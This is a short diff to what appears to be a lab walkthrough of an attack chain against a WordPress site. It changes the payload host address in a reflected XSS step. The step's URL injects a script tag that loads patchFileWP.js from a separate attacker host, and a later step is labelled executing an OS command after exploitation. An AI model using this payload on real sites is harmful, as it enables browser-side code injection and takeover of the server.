@@ -33,12 +33,12 @@
 5. [social engineering attack] victim user clicks link
 
     ```
-    http://192.168.5.10/test/rxss.php?q=<script src=http://192.168.5.13/patchFileWP.js></script>
+    http://192.168.5.10/test/rxss.php?q=<script src=http://192.168.5.15/patchFileWP.js></script>
     ```
 
     * **NOTES**:
       * `192.168.5.10` - target WordPress site
-      * `192.168.5.13` - web server hosting payload
+      * `192.168.5.15` - web server hosting payload
 
 6. [post exploit] execute OS command
 
